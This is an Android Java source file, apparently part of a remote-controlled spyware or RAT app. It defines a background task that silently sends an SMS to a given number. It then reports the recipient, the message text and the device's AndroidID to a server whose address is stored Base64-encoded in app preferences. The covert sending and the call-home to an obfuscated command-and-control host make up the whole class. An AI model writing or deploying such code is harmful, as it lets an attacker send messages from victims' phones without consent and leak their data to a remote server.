package com.asynctask;

import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by ASUS on 2017/12/5.
 */

public class sendText extends AsyncTask<String, Void, String> {
    String i = "";
    String k = "";

    public sendText(String i, String k) {
        this.i = i;
        this.k = k;
    }

    @Override
    protected String doInBackground(String... params) {
        boolean isNumeric = i.matches("[0-9]+");
        if (isNumeric) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(i, null, k, null, null);
            try {
                String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "To: " + i + " Message: " + k);
            } catch (UnsupportedEncodingException e) {

                e.printStackTrace();
            }
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
    }

    @Override
    protected void onPreExecute() {
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}

